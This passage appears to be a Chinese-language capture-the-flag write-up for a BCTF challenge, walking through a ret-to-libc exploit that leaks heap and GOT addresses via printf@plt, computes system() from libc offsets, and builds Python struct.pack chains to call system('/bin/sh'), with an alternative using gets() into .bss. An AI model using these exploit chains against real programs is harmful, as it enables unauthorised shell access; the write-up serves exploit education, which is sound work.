注：SYSTEM_Addr 和EXIT_Addr 通过格式化漏洞读取栈内泄漏的Libc 库地址和给定的Libc

文件计算出具体的内存地址。 







### 示例 BCTF

例如某个实例，目标程序使用了printf来输出，所以在PLT里有printf，而printf@plt 的地址(0x8048650)不会受ASLR 的影响，所以可以利用printf 来输出所需要的那些信息。



注：这里printf@plt 的地址(0x8048650)地址的确定，将目标程序载入IDA，双击左侧函数列表里的_printf函数(注意这里不是printf，函数列表里另有一项printf，事实上是_printf通过jmp指令调到printf，printf再调用got中的printf地址，参见下面的IDA代码片段)，该函数地址即是0x8048650



.plt:08048650 ; int printf(const char *format, ...)

.plt:08048650 _printf     proc near        ; CODE XREF: handler+15

.plt:08048650                     ; list_all_entry+F4 ...

.plt:08048650         jmp   ds:off_804C4E0

.plt:08048650 _printf     endp



extern:0804DAA0 ; int printf(const char *format, ...)

extern:0804DAA0         extrn printf:near    ; CODE XREF: _printf

extern:0804DAA0                     ; DATA XREF: .got.plt:off_804C4E0



.got.plt:0804C4E0 off_804C4E0   dd offset printf    ; DATA XREF: _printf





为了保持程序的运行不退出，printf的返回地址要填成程序中输出主菜单的那个函数(0x08049340)。通常在构造最终攻击的ret-to-libc所需要的信息只是system 的地址以及system 参数的字符串的地址，system 的地址可以通过printf 输出的其他libc函数的地址来计算出，而system的参数字符串可以放在输入的字符串中，如果输入的字符串保存在了全局变量中，则地址是固定的，直接用即可，如果保存在了堆中，则地址不固定，可尝试利用printf可以输出这些字符串在堆中的地址。构造过程如下：

已知信息：

printf@plt 的地址(0x8048650)

主菜单函数(0x08049340)

.rodata段里某%s格式化字符串"invalid command: %s\n"的地址(0x0804B2F7)

用于保存分配的堆的全局指针的地址(0x0804C544)

构造ret-to-libc的基本格式是：

[执行函数地址] + [执行完该函数想要返回的下一处地址] + [参数1] + [参数2] + ...

其中[执行函数地址]处即使原有的函数返回地址

在上述实例中就可以构造如下ret-to-libc链：

pack(0x8048650) + pack(0x08049340) +pack(0x0804B2F7) + pack(0x0804C544)

这样就相当于调用了：

printf("invalid command: %s\n", global_ptr);

从而打印出global_ptr保存的堆地址，并且在调用结束返回到主菜单继续执行。其中该场景中这里的堆内保存的内容是用户输入的可控字符串，这里是用户输入的"/bin/sh"，这样就获取到了该字符串地址。

接下来获取printf在libc中的地址，并以此计算出system 的地址，构造如下ret-to-libc链：

pack(0x8048650) + pack(0x08049340) +pack(0x0804B2F7) + pack(0x804c4e0)

这里和上面类似，其中0x804c4e0是printf在got表中的地址：

.got.plt:0804C4E0 off_804C4E0   dd offset printf    ; DATA XREF: _printf

这样就输出了printf地址，再根据libc.so中的偏移关系，得到system在内存中的地址：

addr_system = addr_printf - 0x4d410 + 0x3ea70

其中0x4d410是printf在libc.so中的偏移，0x3ea70是system在libc.so中的偏移，二者都可以在IDA中加载libc.so获得，双击左侧函数列表的相应函数即可，首地址便是。

system地址和"/bin/sh"字符串都取得了，下一步就可以再次构造ret-to-libc进行最后的调用了：

pack(addr_system) + pack(0x08049340) +pack(addr_binsh)

即调用sytem("/bin/sh")并且在调用结束返回到主菜单继续执行，整个攻击过程完成。



同样还是上面这个例子，还有另一种解法：

首先是定位system等函数地址，上面是利用了程序中的printf函数先打印出printf在got表中的地址，再根据偏移关系计算system地址。另一种方法是首先定位__libc_start_main()的地址，通过gdb发现局部变量buf+0x94处的值跟main()返回到__libc_start_main()地址只差是固定的，而buf内容和长度用户可控的，所以通过控制buf长度，可以使buf打印出的同时输出buf+0x94处的值，就可推算出__libc_start_main()地址，然后算出libc的基地址，进而可以计算出system()和gets()函数地址。

libc_base = struct.unpack('I',s)[0]-0x19406b+0x409e-0x19993		# 其中struct.unpack('I',s)[0]即打印出的是buf+0x94处的值

print 'libc_base @ '+hex(libc_base)

gets = libc_base+0x661a0

system = libc_base+0x3ea70

第二点是system所执行的参数字符串，上面是直接将字符串写在用户可控的堆上，而堆地址被程序保存在全局指针中，通过printf输出函数构造的ret-to-libc即可将该指针指向的堆地址打印出来，进而得到字符串地址。另外一个方法是利用定位到的gets()函数地址，构造ret-to-libc将命令参数读取到.bss段上，再调整到system()指向命令。即构造如下ret-to-libc链，其中0x0804c548即是.bss段上用来保存字符串参数的地址。

struct.pack('I',gets)+\

struct.pack('I',system)+\

struct.pack('I',0x0804c548)+\

struct.pack('I',0x0804c548))